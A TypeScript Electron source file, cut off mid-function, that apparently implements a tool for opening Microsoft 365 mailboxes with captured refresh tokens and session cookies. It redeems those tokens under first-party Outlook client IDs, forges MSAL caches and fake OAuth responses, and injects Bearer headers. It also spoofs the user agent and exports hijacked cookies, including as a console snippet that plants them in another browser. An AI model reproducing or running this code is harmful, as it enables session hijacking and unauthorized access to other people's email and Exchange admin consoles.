import { app, BrowserWindow, shell, ipcMain, safeStorage, session, WebContents, clipboard, net, dialog } from 'electron';
import type { Session } from 'electron';
import fs from 'fs/promises';
import path from 'path';
import { DEFAULT_STATE, AppState } from '../types/state';
import { refreshMicrosoftToken, normalizeAuthorityTenant, type TokenRefreshResult } from './microsoftOAuthRefresh';
import { runCookieToTokenConversion, applyParsedCookiesToSession } from './cookieImport';
import {
  parseCookiePaste,
  filterMicrosoftRelatedCookies,
  cookiesToHeaderString,
  cookiesToNetscape,
  type ParsedCookie,
} from '../shared/cookieFormat';
import { diagnoseMicrosoftAuthError } from '../shared/microsoftAuthDiagnostics';

// --------------------------------------------------------------------------
// Logging helpers
// --------------------------------------------------------------------------
// The Outlook / MSAL flows are extremely chatty (token payloads, MSAL cache
// keys, every protocol-handle decision). Most of that is only useful when
// debugging a specific OAuth issue. Gate it behind WATCHER_LOG_LEVEL so the
// default user-facing log stream stays signal-rich.
//
// Levels (lowest -> highest verbosity):
//   error  : only console.error  (always emitted)
//   warn   : + console.warn      (always emitted)
//   info   : + bare console.log  (default; startup + scheduler lifecycle only)
//   debug  : + dlog              (per-request OWA traces, token payloads, ...)
//
// Set via env var, e.g. `WATCHER_LOG_LEVEL=debug npm start`.
const LOG_LEVELS = { error: 0, warn: 1, info: 2, debug: 3 } as const;
type LogLevel = keyof typeof LOG_LEVELS;
const __envLevel = (process.env.WATCHER_LOG_LEVEL || '').toLowerCase() as LogLevel;
const CURRENT_LOG_LEVEL: number =
  __envLevel in LOG_LEVELS ? LOG_LEVELS[__envLevel] : LOG_LEVELS.info;
const __rawConsoleLog = console.log.bind(console);
function dlog(...args: unknown[]): void {
  if (CURRENT_LOG_LEVEL >= LOG_LEVELS.debug) __rawConsoleLog(...args);
}

// Window to account mapping for MSAL cache injection
const windowToAccountMap = new Map<number, string>();
// MSAL cache storage (accountId -> cache entries)
const msalCacheMap = new Map<string, Record<string, string>>();
// Raw tokens per account - used by preload to serve fake OAuth code exchange responses
const outlookTokenStore = new Map<string, {
  accessToken: string; refreshToken: string; idToken: string;
  scope: string; expiresIn: number;
  oid: string; tid: string; email: string; name: string; clientId: string;
}>();

// Per Outlook partition: current Bearer + mailbox for webRequest (one hook per session, token refreshed each open)
const outlookSessionAuth = new WeakMap<Session, { accessToken: string; email: string }>();

/** Last successful in-memory OWA token refresh (avoids redundant refresh + focus storms). */
const owaLastSuccessfulRefresh = new Map<string, number>();
const owaRefreshLocks = new Set<string>();
const owaLastAutoHealAt = new Map<string, number>();

/** Open Outlook windows per account (accountId -> BrowserWindow) to prevent duplicate windows. */
const outlookWindows = new Map<string, BrowserWindow>();

/**
 * Monotonic counter per windowKey ('accountId:mode') incremented on every
 * successful Outlook window open. Each window's `closed` handler captures the
 * generation it belonged to and only runs its cleanup when the current
 * generation still matches — protecting against a stale close-handler from
 * a previous open running *after* the user has already reopened the window
 * and clobbering the fresh `outlookTokenStore` entry / protocol handler.
 *
 * This was the root cause of the "press play, close, press play again,
 * doesn't open" symptom: the first open's close handler was firing late,
 * deleting the second open's tokens and unregistering its protocol
 * interceptor, leaving the second window with no auth.
 */
const outlookWindowGeneration = new Map<string, number>();

const SIGNED_OUT_TEXT_RE = /session has expired|you need to sign in/i;


type OwaTokenBundle = {
  account: any;
  store: Record<string, any>;
  accessToken: string;
  tokenResult: TokenRefreshResult;
  clientIdOverride: string;
  tokenPayload: any;
};

/**
 * Acquire fresh delegated tokens + persist rotated refresh tokens (same logic as first-time Open Outlook).
 */
async function loadOwaTokenBundle(accountId: string): Promise<OwaTokenBundle> {
  const store = await readStore();
  const accounts: any[] = store.accounts || [];
  const account = accounts.find((a: any) => a.id === accountId);
  if (!account) throw new Error('Account not found');
  if (account.auth?.type !== 'token') {
    throw new Error('Account does not have token auth');
  }

  let useClientId: string;
  let useAuthorityEndpoint: string;
  let useRefreshToken: string;
  let useScopeType: string;
  let useResource: string;

  if (account.auth.v2Token) {
    useClientId = account.auth.v2Token.clientId;
    useAuthorityEndpoint = account.auth.v2Token.authorityEndpoint || 'common';
    useRefreshToken = account.auth.v2Token.refreshToken;
    useScopeType = account.auth.v2Token.scopeType || 'graph';
    if (useScopeType === 'graph') {
      throw new Error(
        'This account was captured with Graph access only. OWA requires an EWS token. Re-capture this account with scope_type=ews.'
      );
    }
    useResource = account.auth.v2Token.resource || 'https://outlook.office.com';
  } else {
    useClientId = account.auth.clientId;
    useAuthorityEndpoint = account.auth.authorityEndpoint;
    useRefreshToken = account.auth.refreshToken;
    useScopeType = account.auth.scopeType || 'ews';
    if (useScopeType === 'graph' && !account.auth.v2Token) {
      throw new Error(
        'This account was captured with Graph access only. OWA requires an EWS token. Re-capture this account with scope_type=ews.'
      );
    }
    useResource = account.auth.resource || 'https://outlook.office.com';
  }

  if (!useClientId || !useAuthorityEndpoint || !useRefreshToken) {
    throw new Error('Missing required auth fields');
  }

  let tokenResult = await refreshMicrosoftToken(
    useClientId,
    useAuthorityEndpoint,
    useRefreshToken,
    useScopeType,
    useResource
  );

  let accountStoreDirty = false;
  if (tokenResult.refreshToken && tokenResult.refreshToken !== useRefreshToken) {
    if (account.auth.v2Token) {
      account.auth.v2Token.refreshToken = tokenResult.refreshToken;
    }
    account.auth.refreshToken = tokenResult.refreshToken;
    accountStoreDirty = true;
  }

  if (!account.auth.v2Token && useScopeType === 'ews') {
    try {
      const v2Result = await exchangeV1ForV2Token(useClientId, useAuthorityEndpoint, tokenResult.refreshToken, useResource);
      account.auth.v2Token = {
        clientId: useClientId,
        authorityEndpoint: useAuthorityEndpoint,
        refreshToken: v2Result.refreshToken,
        resource: 'https://outlook.office.com',
        scopeType: 'ews',
      };
      accountStoreDirty = true;
      tokenResult = {
        ...tokenResult,
        accessToken: v2Result.accessToken,
        refreshToken: v2Result.refreshToken,
        idToken: v2Result.idToken,
        expiresIn: v2Result.expiresIn,
        tokenType: v2Result.tokenType,
        scope: tokenResult.scope,
      };
    } catch (error: any) {
      console.error('[Outlook] V2 token exchange failed:', error.message);
    }
  }
  if (accountStoreDirty) {
    await writeStore(store);
  }

  const state = await readState();
  const preferredOwaClientId = state.owaClientId || '9199bf20-a13f-4107-85dc-02114787ef48';
  let effectiveClientIdForCache = useClientId;
  if (useScopeType === 'ews' && preferredOwaClientId && preferredOwaClientId !== useClientId) {
    try {
      const owaClientToken = await refreshMicrosoftToken(
        preferredOwaClientId,
        useAuthorityEndpoint,
        tokenResult.refreshToken,
        useScopeType,
        useResource
      );
      appendOutlookDebug(`[Outlook] Redeemed token for OWA client_id=${preferredOwaClientId}`);
      tokenResult = owaClientToken;
      effectiveClientIdForCache = preferredOwaClientId;
    } catch (error: any) {
      appendOutlookDebug(`[Outlook] OWA-client token redeem failed for ${preferredOwaClientId}: ${error?.message || String(error)}`);
      console.warn('[Outlook] OWA client token redeem failed, continuing with base token:', error?.message || error);
    }
  }

  const accessToken = tokenResult.accessToken;
  let tokenPayload: any = {};
  try {
    const parts = accessToken.split('.');
    if (parts.length === 3) {
      tokenPayload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
    }
  } catch (err) {
    console.warn('[Outlook] Failed to decode token:', err);
  }

  // IMPORTANT: Use the client id that actually produced the current access
  // token bundle. A stale globally-captured OWA client id can mismatch token
  // audience/appid and cause immediate signed-out banners in OWA.
  const tokenClientId =
    (typeof tokenPayload?.appid === 'string' && tokenPayload.appid.trim()) ||
    (typeof tokenPayload?.azp === 'string' && tokenPayload.azp.trim()) ||
    '';
  const clientIdOverride =
    tokenClientId ||
    effectiveClientIdForCache ||
    account.auth?.v2Token?.clientId ||
    account.auth?.clientId ||
    'd3590ed6-52b3-4102-aeff-aad2292ab01c';

  return { account, store, accessToken, tokenResult, clientIdOverride, tokenPayload };
}

function applyOwaTokenBundleToRunningSession(accountId: string, bundle: OwaTokenBundle, outlookSession: Session): void {
  const { account, accessToken, tokenResult, clientIdOverride, tokenPayload } = bundle;
  const tokenClientId =
    (typeof tokenPayload?.appid === 'string' && tokenPayload.appid.trim()) ||
    (typeof tokenPayload?.azp === 'string' && tokenPayload.azp.trim()) ||
    '';
  const resolvedClientId = tokenClientId || clientIdOverride;
  outlookTokenStore.set(accountId, {
    accessToken,
    refreshToken: tokenResult.refreshToken,
    idToken: tokenResult.idToken || '',
    scope: tokenResult.scope || 'https://outlook.office.com/.default openid profile offline_access',
    expiresIn: tokenResult.expiresIn,
    oid: tokenPayload.oid || '',
    tid: tokenPayload.tid || '',
    email: account.email,
    name: account.name || account.email,
    clientId: resolvedClientId,
  });

  let msalCache: Record<string, string>;
  try {
    msalCache = generateMsalCache(account, accessToken, tokenResult.refreshToken, tokenResult.idToken, resolvedClientId);
  } catch (err) {
    console.error('[MSAL] Failed to generate cache:', err);
    msalCache = {};
  }
  msalCacheMap.set(accountId, msalCache);
  outlookSessionAuth.set(outlookSession, { accessToken, email: account.email });
}

async function tryRefreshOwaWindowSession(
  accountId: string,
  outlookSession: Session,
  wc: WebContents,
  minMsSinceLastSuccess: number,
  reason: string
): Promise<void> {
  const last = owaLastSuccessfulRefresh.get(accountId) || 0;
  if (minMsSinceLastSuccess > 0 && Date.now() - last < minMsSinceLastSuccess) {
    return;
  }
  if (owaRefreshLocks.has(accountId)) {
    return;
  }
  owaRefreshLocks.add(accountId);
  try {
    const bundle = await loadOwaTokenBundle(accountId);
    applyOwaTokenBundleToRunningSession(accountId, bundle, outlookSession);
    await reinjectMsalCacheIntoOwaPage(wc, accountId);
    owaLastSuccessfulRefresh.set(accountId, Date.now());
    appendOutlookDebug(`[Outlook] Session tokens refreshed (${reason})`);
  } catch (e: any) {
    appendOutlookDebug(`[Outlook] Session refresh failed (${reason}): ${e?.message || e}`);
  } finally {
    owaRefreshLocks.delete(accountId);
  }
}

async function forceRefreshAndReloadOutlookWindow(
  accountId: string,
  outlookSession: Session,
  wc: WebContents,
  reason: string
): Promise<void> {
  if (owaRefreshLocks.has(accountId)) return;
  owaRefreshLocks.add(accountId);
  try {
    const bundle = await loadOwaTokenBundle(accountId);
    applyOwaTokenBundleToRunningSession(accountId, bundle, outlookSession);
    await reinjectMsalCacheIntoOwaPage(wc, accountId);
    owaLastSuccessfulRefresh.set(accountId, Date.now());
    appendOutlookDebug(`[Outlook] Force refresh succeeded (${reason}); reloading page`);
    try {
      wc.reloadIgnoringCache();
    } catch {
      // ignore reload failures
    }
  } catch (e: any) {
    appendOutlookDebug(`[Outlook] Force refresh failed (${reason}): ${e?.message || e}`);
  } finally {
    owaRefreshLocks.delete(accountId);
  }
}

const OWA_BEARER_URL_PATTERNS = [
  '*://outlook.office.com/*',
  '*://outlook.office365.com/*',
  '*://outlook.cloud.microsoft/*',
  '*://m365.cloud.microsoft/*',
  '*://substrate.office.com/*',
  '*://attachments.office.net/*',
  '*://www.office.com/*',
  '*://office.com/*',
  '*://admin.exchange.microsoft.com/*',
  '*://admin.microsoft.com/*',
];

const LOGIN_HINT_URL_PATTERNS = ['*://login.microsoftonline.com/*', '*://login.windows.net/*'];
const OUTLOOK_DEBUG_MAX_LINES = 1200;
const outlookDebugLines: string[] = [];

function appendOutlookDebug(line: string): void {
  const stamped = `${new Date().toISOString()} ${line}`;
  outlookDebugLines.push(stamped);
  if (outlookDebugLines.length > OUTLOOK_DEBUG_MAX_LINES) {
    outlookDebugLines.splice(0, outlookDebugLines.length - OUTLOOK_DEBUG_MAX_LINES);
  }
}

/**
 * Append `?mkt=<displayLanguage>` (or merge into existing query) to any
 * Outlook on the web URL we open, so OWA renders in the user's chosen
 * default language regardless of the mailbox's own preference. The
 * preference comes from Settings → Outlook display.
 */
async function applyOwaDisplayLanguage(rawUrl: string): Promise<string> {
  try {
    const store = await readStore();
    const lang =
      typeof store?.settings?.outlook?.displayLanguage === 'string'
        ? store.settings.outlook.displayLanguage.trim()
        : '';
    if (!lang) return rawUrl;
    const u = new URL(rawUrl);
    u.searchParams.set('mkt', lang);
    // OWA also honours `locale` on its bootstrap. Setting both removes
    // any race between the two.
    if (!u.searchParams.has('locale')) u.searchParams.set('locale', lang);
    return u.toString();
  } catch {
    return rawUrl;
  }
}

function extractClientIdFromUrl(urlStr: string): string | null {
  try {
    const u = new URL(urlStr);
    const cid = u.searchParams.get('client_id');
    if (!cid) return null;
    if (!/^[0-9a-fA-F-]{36}$/.test(cid)) return null;
    return cid;
  } catch {
    return null;
  }
}

function decryptStoredCookiePayload(encB64: string): string {
  if (!safeStorage.isEncryptionAvailable()) return encB64;
  try {
    return safeStorage.decryptString(Buffer.from(encB64, 'base64'));
  } catch {
    return encB64;
  }
}

/** Decrypt stored Microsoft cookie paste for cookie-only accounts. */
function getMicrosoftCookiePasteFromAccount(account: any): string | null {
  const auth = account?.auth;
  if (!auth) return null;
  if (auth.type === 'cookie') {
    const enc = auth.cookiesEncrypted || auth.cookies;
    if (!enc || typeof enc !== 'string') return null;
    const raw = decryptStoredCookiePayload(enc).trim();
    return raw || null;
  }
  return null;
}

// Cookie sets that only include helper cookies (e.g. DefaultAnchorMailbox,
// msal.cache.encryption) are not sufficient to restore a real OWA browser
// session. We track which cookies look like "real" Microsoft auth cookies so
// the UI can warn the user when the captured snapshot is too thin.
const STRONG_MICROSOFT_AUTH_COOKIE_PATTERNS: RegExp[] = [
  /^ESTSAUTH/i,
  /^ESTSSC$/i,
  /^OpenIdConnect\.(token|id_token|nonce)/i,
  /^X-OWA-CANARY$/i,
  /^Canary$/i,
  /^rtFa$/i,
  /^FedAuth$/i,
  /^RPSAuth$/i,
  /^MSP(Auth|Requ|OK|Prof|CID|TC)$/i,
  /^esctx$/i,
];

function hasStrongMicrosoftSessionCookies(cookies: ParsedCookie[]): boolean {
  return cookies.some((c) => {
    const name = String(c.name || '').trim();
    if (!name) return false;
    return STRONG_MICROSOFT_AUTH_COOKIE_PATTERNS.some((re) => re.test(name));
  });
}

function countStrongMicrosoftSessionCookies(cookies: ParsedCookie[]): number {
  let n = 0;
  for (const c of cookies) {
    const name = String(c.name || '').trim();
    if (!name) continue;
    if (STRONG_MICROSOFT_AUTH_COOKIE_PATTERNS.some((re) => re.test(name))) n++;
  }
  return n;
}

/**
 * Convert parsed cookies into the JSON shape that browser cookie-importer
 * extensions (Cookie-Editor / EditThisCookie) accept. The output is a flat
 * array of objects with the fields those extensions expect.
 */
function cookiesToExtensionImportRows(cookies: ParsedCookie[]): Array<Record<string, unknown>> {
  const normalizeImporterSameSite = (
    sameSite?: string
  ): 'lax' | 'strict' | 'no_restriction' | undefined => {
    const raw = String(sameSite || '').trim().toLowerCase();
    if (!raw || raw === 'unspecified') return undefined;
    if (raw === 'none' || raw === 'no_restriction') return 'no_restriction';
    if (raw === 'lax') return 'lax';
    if (raw === 'strict') return 'strict';
    return undefined;
  };
  const rows: Array<Record<string, unknown>> = [];
  for (const cookie of cookies) {
    const rawDomain = String(cookie.domain || '').trim();
    const domain = rawDomain.replace(/^\./, '');
    const name = String(cookie.name || '').trim();
    if (!domain || !name) continue;
    const row: Record<string, unknown> = {
      name,
      value: cookie.value,
      domain,
      expirationDate:
        typeof cookie.expirationDate === 'number'
          ? Math.floor(cookie.expirationDate)
          : undefined,
      hostOnly: cookie.hostOnly ?? !rawDomain.startsWith('.'),
      httpOnly: cookie.httpOnly !== false,
      path: cookie.path || '/',
      secure: cookie.secure !== false,
      session: cookie.session ?? !cookie.expirationDate,
      storeId:
        typeof cookie.storeId === 'string' || cookie.storeId === null
          ? cookie.storeId
          : null,
    };
    const sameSite = normalizeImporterSameSite(cookie.sameSite);
    if (sameSite) row.sameSite = sameSite;
    rows.push(row);
  }
  return rows;
}

function cookiesToExtensionImportJson(cookies: ParsedCookie[]): string {
  return JSON.stringify(cookiesToExtensionImportRows(cookies), null, 2);
}

/**
 * Build a self-contained DevTools console snippet. The user pastes it into
 * the JS console on `outlook.office.com` (or any Microsoft host); it walks
 * through every relevant host, writes each non-HttpOnly cookie via
 * `document.cookie`, and finally navigates to the inbox. After the
 * navigation completes the user is signed in.
 *
 * HttpOnly cookies cannot be set through `document.cookie`, so the snippet
 * also surfaces them on `window.__owaCookieMap` for any extension that
 * supports manual injection. For maximum reliability, prefer the
 * Cookie-Editor / EditThisCookie JSON path.
 */
function cookiesToBrowserConsoleSnippet(cookies: ParsedCookie[]): string {
  const serializable = cookiesToExtensionImportRows(cookies);
  const httpOnlySkipped = serializable
    .filter((cookie) => cookie.httpOnly)
    .map((cookie) => cookie.name);
  const cookieWritable = serializable.filter((cookie) => !cookie.httpOnly);
  const cookieHeader = cookiesToHeaderString(cookies);
  const normalizeHost = (domain?: string) => String(domain || '').replace(/^\./, '').toLowerCase();
  const writableHosts = Array.from(
    new Set(
      cookieWritable
        .map((cookie) => normalizeHost(typeof cookie.domain === 'string' ? cookie.domain : undefined))
        .filter(Boolean)
    )
  ).sort((a, b) => {
    const preferred = [
      'login.microsoftonline.com',
      'login.live.com',
      'outlook.office.com',
      'outlook.office365.com',
      'outlook.cloud.microsoft',
    ];
    const ai = preferred.indexOf(a);
    const bi = preferred.indexOf(b);
    if (ai !== -1 || bi !== -1) {
      return (ai === -1 ? preferred.length : ai) - (bi === -1 ? preferred.length : bi);
    }
    return a.localeCompare(b);
  });
  const outlookHost =
    writableHosts.find((host) => host.includes('outlook')) || 'outlook.office.com';
  const targetUrl = `https://${outlookHost}/mail/`;
  const payload = JSON.stringify(cookieWritable);
  const skippedComment = httpOnlySkipped.length
    ? `/* HttpOnly cookies omitted from document.cookie path: ${httpOnlySkipped.join(', ')} */\n`
    : '';
  return (
    `${skippedComment};(() => {\n` +
    `  const cookies = JSON.parse(${JSON.stringify(payload)});\n` +
    `  const hosts = ${JSON.stringify(writableHosts)};\n` +
    `  const stateKey = '__OWA_COOKIE_BOOTSTRAP__:';\n` +
    `  const targetUrl = ${JSON.stringify(targetUrl)};\n` +
    `  const normalizeHost = (domain) => String(domain || '').replace(/^\\./, '').toLowerCase();\n` +
    `  const matchesHost = (cookie, host) => { const d = normalizeHost(cookie.domain); return !!d && (host === d || host.endsWith('.' + d)); };\n` +
    `  const writableForHost = (host) => cookies.filter((cookie) => matchesHost(cookie, host));\n` +
    `  let state = null;\n` +
    `  try { if (typeof window.name === 'string' && window.name.startsWith(stateKey)) state = JSON.parse(window.name.slice(stateKey.length)); } catch (_) { state = null; }\n` +
    `  if (!state || !Array.isArray(state.cookies) || !Array.isArray(state.hosts)) {\n` +
    `    state = { cookies, hosts, step: 0, targetUrl };\n` +
    `    window.name = stateKey + JSON.stringify(state);\n` +
    `  }\n` +
    `  const currentHost = location.hostname.toLowerCase();\n` +
    `  const currentTargetHost = state.hosts[state.step];\n` +
    `  if (!currentTargetHost) {\n` +
    `    window.__owaCookieHeader = ${JSON.stringify(cookieHeader)};\n` +
    `    window.__owaCookieMap = ${JSON.stringify(serializable, null, 2)};\n` +
    `    if (${JSON.stringify(httpOnlySkipped)}.length) console.warn('Skipped HttpOnly cookies:', ${JSON.stringify(httpOnlySkipped)});\n` +
    `    window.name = '';\n` +
    `    if (location.href !== state.targetUrl) location.href = state.targetUrl;\n` +
    `    return;\n` +
    `  }\n` +
    `  if (!(currentHost === currentTargetHost || currentHost.endsWith('.' + currentTargetHost))) {\n` +
    `    location.href = 'https://' + currentTargetHost + '/';\n` +
    `    return;\n` +
    `  }\n` +
    `  window.__owaCookieHeader = ${JSON.stringify(cookieHeader)};\n` +
    `  window.__owaCookieMap = ${JSON.stringify(serializable, null, 2)};\n` +
    `  for (const o of writableForHost(currentHost)) {\n` +
    `    const parts = [\`\${o.name}=\${o.value}\`];\n` +
    `    if (o.session !== true && typeof o.expirationDate === 'number') parts.push(\`Expires=\${new Date(o.expirationDate * 1000).toUTCString()}\`);\n` +
    `    else parts.push('Max-Age=31536000');\n` +
    `    parts.push(o.path ? \`path=\${o.path}\` : 'path=/');\n` +
    `    if (o.domain) parts.push(\`domain=\${o.domain}\`);\n` +
    `    if (o.secure !== false) parts.push('Secure');\n` +
    `    parts.push(\`SameSite=\${o.sameSite || 'None'}\`);\n` +
    `    document.cookie = parts.join(';');\n` +
    `  }\n` +
    `  if (${JSON.stringify(httpOnlySkipped)}.length) {\n` +
    `    console.warn('Skipped HttpOnly cookies:', ${JSON.stringify(httpOnlySkipped)});\n` +
    `  }\n` +
    `  state.step += 1;\n` +
    `  window.name = stateKey + JSON.stringify(state);\n` +
    `  const nextHost = state.hosts[state.step];\n` +
    `  if (nextHost) {\n` +
    `    location.href = 'https://' + nextHost + '/';\n` +
    `    return;\n` +
    `  }\n` +
    `  window.name = '';\n` +
    `  location.href = state.targetUrl;\n` +
    `})();`
  );
}

type CapturedOwaCookieSnapshot = {
  account: any;
  cookies: ParsedCookie[];
  strongCount: number;
  netscape: string;
  header: string;
  extensionJson: string;
  browserSnippet: string;
  quality: 'strong' | 'weak';
};

/**
 * Capture the Microsoft session cookies stored under a token account's OWA
 * partition. If the partition has no cookies yet, primes them by briefly
 * loading https://outlook.office.com/mail/inbox in a hidden BrowserWindow with
 * the same partition + preload long enough for the OAuth interceptor + AAD
 * redirects to set the auth cookies.
 */
async function captureTokenBackedOwaCookies(accountId: string): Promise<CapturedOwaCookieSnapshot> {
  const store = await readStore();
  const accounts: any[] = store.accounts || [];
  const account = accounts.find((a: any) => a.id === accountId);
  if (!account) throw new Error('Account not found');
  if (account.auth?.type !== 'token') {
    throw new Error('Cookie export only applies to token-based Microsoft accounts.');
  }

  // Must match the partition used by mailbox:openOutlook (token path) so we
  // read cookies from the same jar OWA actually populated.
  const partitionName = `persist:outlook-${accountId}`;
  const owaSession = session.fromPartition(partitionName);

  const readMicrosoftCookies = async (): Promise<ParsedCookie[]> => {
    const all = await owaSession.cookies.get({});
    const parsed: ParsedCookie[] = all.map((c) => ({
      name: c.name,
      value: c.value,
      domain: c.domain,
      path: c.path || '/',
      secure: c.secure !== false,
      httpOnly: c.httpOnly === true,
      hostOnly: c.hostOnly === true,
      sameSite:
        c.sameSite === 'lax'
          ? 'lax'
          : c.sameSite === 'strict'
            ? 'strict'
            : c.sameSite === 'no_restriction'
              ? 'none'
              : undefined,
      session: c.session === true,
      expirationDate: c.expirationDate,
    }));
    return filterMicrosoftRelatedCookies(parsed);
  };

  let msCookies = await readMicrosoftCookies();
  if (msCookies.length === 0 || !hasStrongMicrosoftSessionCookies(msCookies)) {
    appendOutlookDebug(`[ExportCookies] Partition empty/weak, priming for ${accountId}`);
    try {
      const bundle = await loadOwaTokenBundle(accountId);
      applyOwaTokenBundleToRunningSession(accountId, bundle, owaSession);
      installOutlookPartitionRequestHooks(owaSession);
    } catch (err) {
      throw new Error(
        `Could not stage tokens for ${account.email}: ${err instanceof Error ? err.message : String(err)}`
      );
    }

    const primer = new BrowserWindow({
      width: 800,
      height: 600,
      show: false,
      webPreferences: {
        partition: partitionName,
        contextIsolation: false,
        nodeIntegration: false,
        sandbox: false,
        preload: path.join(__dirname, 'preload-mailbox.js'),
      },
    });
    windowToAccountMap.set(primer.webContents.id, accountId);

    const PRIME_TIMEOUT_MS = 12000;
    const primerUrl = await applyOwaDisplayLanguage('https://outlook.office.com/mail/inbox');
    try {
      await new Promise<void>((resolve) => {
        const settled = { done: false };
        const finish = () => {
          if (settled.done) return;
          settled.done = true;
          clearInterval(pollTimer);
          clearTimeout(hardTimeout);
          resolve();
        };
        const pollTimer = setInterval(async () => {
          try {
            const probe = await readMicrosoftCookies();
            if (probe.length > 0 && hasStrongMicrosoftSessionCookies(probe)) finish();
          } catch {
            /* keep polling */
          }
        }, 750);
        const hardTimeout = setTimeout(finish, PRIME_TIMEOUT_MS);
        primer.loadURL(primerUrl).catch((loadErr) => {
          appendOutlookDebug(
            `[ExportCookies] primer loadURL failed: ${loadErr instanceof Error ? loadErr.message : String(loadErr)}`
          );
        });
      });
    } finally {
      windowToAccountMap.delete(primer.webContents.id);
      if (!primer.isDestroyed()) primer.destroy();
    }

    msCookies = await readMicrosoftCookies();
  }

  if (msCookies.length === 0) {
    throw new Error(
      `No Microsoft cookies could be captured for ${account.email}. Try opening Outlook (the play button) once first; the session needs to settle before cookies can be exported.`
    );
  }

  const strongCount = countStrongMicrosoftSessionCookies(msCookies);

  return {
    account,
    cookies: msCookies,
    strongCount,
    netscape: cookiesToNetscape(msCookies),
    header: cookiesToHeaderString(msCookies),
    extensionJson: cookiesToExtensionImportJson(msCookies),
    browserSnippet: cookiesToBrowserConsoleSnippet(msCookies),
    quality: strongCount > 0 ? 'strong' : 'weak',
  };
}

/**
 * Open OWA using Microsoft session cookies only (no MSAL / token intercept).
 * Expects a Netscape / JSON / header paste compatible with `parseCookiePaste`.
 */
async function openOwaWithCookieSession(
  accountId: string,
  account: any,
  cookiePaste: string,
  mode: 'owa' | 'exchangeAdmin'
): Promise<void> {
  const parsedAll = parseCookiePaste(cookiePaste);
  const msCookies = filterMicrosoftRelatedCookies(parsedAll);
  const toApply = msCookies.length ? msCookies : parsedAll;
  if (!toApply.length) {
    throw new Error(
      'Could not parse Microsoft cookies from stored value (expect Netscape export, JSON, or Cookie header).'
    );
  }

  const partitionName = `persist:outlook-cookie-${accountId}`;
  const outlookSession = session.fromPartition(partitionName);

  try {
    await outlookSession.clearStorageData({ storages: ['cookies'] });
  } catch (e) {
    console.warn('[OutlookCookie] clearStorageData:', e);
  }

  const applied = await applyParsedCookiesToSession(outlookSession, toApply);
  if (applied === 0) {
    throw new Error('No cookies could be applied to the OWA browser partition.');
  }
  appendOutlookDebug(`[OutlookCookie] Applied ${applied} cookies account=${accountId}`);

  outlookSessionAuth.set(outlookSession, { accessToken: '', email: String(account.email || '') });

  await Promise.all([
    outlookSession.cookies.set({
      url: 'https://outlook.office.com',
      name: 'DefaultAnchorMailbox',
      value: `UPN:${account.email}`,
      domain: '.outlook.office.com',
      path: '/',
      secure: true,
      httpOnly: true,
      sameSite: 'no_restriction',
    }),
    outlookSession.cookies.set({
      url: 'https://login.microsoftonline.com',
      name: 'DefaultAnchorMailbox',
      value: `UPN:${account.email}`,
      domain: '.login.microsoftonline.com',
      path: '/',
      secure: true,
      httpOnly: true,
      sameSite: 'no_restriction',
    }),
  ]);

  installOutlookPartitionRequestHooks(outlookSession);

  const baseStartUrl =
    mode === 'exchangeAdmin'
      ? 'https://admin.exchange.microsoft.com/'
      : 'https://outlook.office.com/mail/inbox';
  const startUrl = mode === 'exchangeAdmin'
    ? baseStartUrl
    : await applyOwaDisplayLanguage(baseStartUrl);
  const windowTitle =
    mode === 'exchangeAdmin' ? `Exchange admin - ${account.email}` : `Outlook (cookies) - ${account.email}`;

  // Duplicate window prevention (cookie)
  const windowKey = `${accountId}:${mode}:cookie`;
  const existing = outlookWindows.get(windowKey);
  if (existing && !existing.isDestroyed()) {
    existing.focus();
    if (existing.isMinimized()) existing.restore();
    return;
  }

  const outlookWindow = new BrowserWindow({
    width: 1400,
    height: 900,
    show: true,
    title: windowTitle,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: false,
      partition: partitionName,
      preload: path.join(__dirname, 'preload-mailbox-cookie.js'),
    },
  });
  outlookWindows.set(windowKey, outlookWindow);
  const myGeneration = (outlookWindowGeneration.get(windowKey) || 0) + 1;
  outlookWindowGeneration.set(windowKey, myGeneration);

  // Mirror token-mode popup policy so OWA "Sign in" can open Microsoft auth
  // windows inside Electron instead of showing "enable pop-ups" loops.
  outlookWindow.webContents.setWindowOpenHandler(({ url }) => {
    try {
      const u = new URL(url);
      const allowedHosts = [
        'outlook.office.com',
        'outlook.office365.com',
        'outlook.cloud.microsoft',
        'login.microsoftonline.com',
        'login.windows.net',
        'admin.exchange.microsoft.com',
        'admin.microsoft.com',
        'm365.cloud.microsoft',
      ];
      const isInternal =
        allowedHosts.includes(u.hostname) ||
        u.hostname.endsWith('.office.com') ||
        u.hostname.endsWith('.office365.com') ||
        u.hostname.endsWith('.exchange.microsoft.com') ||
        u.hostname.endsWith('.cloud.microsoft');
      if (isInternal) {
        appendOutlookDebug(`[OutlookCookie] Allowing internal popup: ${url}`);
        return {
          action: 'allow',
          overrideBrowserWindowOptions: {
            width: 1024,
            height: 768,
            webPreferences: {
              partition: partitionName,
              contextIsolation: false,
              nodeIntegration: false,
              sandbox: false,
              preload: path.join(__dirname, 'preload-mailbox-cookie.js'),
            },
          },
        };
      }
      shell.openExternal(url).catch(() => {});
    } catch (err) {
      console.error('[OutlookCookie] Failed to process window-open:', err);
    }
    return { action: 'deny' };
  });

  outlookWindow.on('closed', () => {
    const currentGeneration = outlookWindowGeneration.get(windowKey);
    if (currentGeneration === myGeneration) {
      outlookSessionAuth.delete(outlookSession);
      outlookWindows.delete(windowKey);
      outlookWindowGeneration.delete(windowKey);
    }
  });

  outlookWindow.webContents.setUserAgent(
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
  );

  outlookWindow.webContents.on('did-fail-load', (_event, errorCode, errorDescription, validatedURL) => {
    console.error('[OutlookCookie] did-fail-load', errorCode, errorDescription, validatedURL);
    appendOutlookDebug(`[OutlookCookie] did-fail-load code=${errorCode} url=${validatedURL}`);
  });

  void outlookWindow.loadURL(startUrl);
}

function installOutlookPartitionRequestHooks(outlookSess: Session): void {
  if ((outlookSess as any).__owaPartitionHooks) return;
  (outlookSess as any).__owaPartitionHooks = true;

  outlookSess.webRequest.onBeforeSendHeaders({ urls: OWA_BEARER_URL_PATTERNS }, (details, callback) => {
    const auth = outlookSessionAuth.get(outlookSess);
    if (!auth?.accessToken) {
      callback({ requestHeaders: details.requestHeaders });
      return;
    }
    const h = { ...details.requestHeaders };
    h['Authorization'] = `Bearer ${auth.accessToken}`;
    h['X-AnchorMailbox'] = auth.email;
    h['AnchorMailbox'] = auth.email;
    h['client-request-id'] = crypto.randomUUID();
